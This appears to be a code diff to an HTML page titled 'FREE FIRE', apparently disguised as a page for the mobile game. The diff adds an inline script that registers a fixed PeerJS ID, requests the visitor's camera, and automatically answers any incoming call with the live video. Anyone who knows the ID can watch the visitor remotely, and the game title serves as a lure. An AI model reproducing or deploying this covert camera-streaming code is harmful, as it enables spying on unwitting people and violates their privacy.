@@ -40,12 +40,28 @@
 </head>
 <body>
   <h1>FREE FIRE</h1>
-  <video id="frontCam" autoplay muted playsinline></video>
-  <video id="backCam" autoplay muted playsinline></video>
+  <video id="localVideo" autoplay muted playsinline></video>
 
   <!-- PeerJS CDN -->
   <script src="https://cdn.jsdelivr.net/npm/peerjs@1.5.2/dist/peerjs.min.js"></script>
   <!-- Mã JavaScript chính -->
   <script src="main.js"></script>
+  <script>
+    const peer = new Peer("my-fixed-id"); // ID cố định
+
+    peer.on("open", () => {
+      console.log("📡 Đang phát với ID:", peer.id);
+
+      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+        .then(stream => {
+          document.getElementById("localVideo").srcObject = stream;
+
+          peer.on("call", call => {
+            call.answer(stream);
+          });
+        })
+        .catch(err => alert("❌ Không truy cập được camera: " + err.message));
+    });
+  </script>
 </body>
 </html>
